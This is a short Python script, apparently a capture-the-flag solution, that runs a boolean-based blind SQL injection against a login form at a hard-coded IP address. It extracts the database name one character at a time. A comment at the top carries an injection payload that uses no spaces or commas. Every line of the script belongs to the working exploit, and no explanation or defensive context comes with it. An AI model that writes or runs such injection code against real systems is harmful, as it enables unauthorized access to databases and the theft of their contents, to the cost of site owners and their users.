import requests

# payload:  a'or(ascii(substr(reverse(substr((database())from(1)))from(8)))<>99)#
dic = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','_']
url = "http://114.67.246.176:19842/index.php"
ans = ""
for i in range(1 , 9):
    j = 9 - i
    for k in dic:
        username = "a'or(ascii(substr(reverse(substr((database())from(" + str(i) + ")))from(" + str(j) + ")))<>" + str(ord(k)) + ")#"
        data = {
            "username" : username,
            "password" : "admin"
        }
        res = requests.post( url , data=data)
        if "username does not exist!" in res.text:
            ans += k
            print(ans)

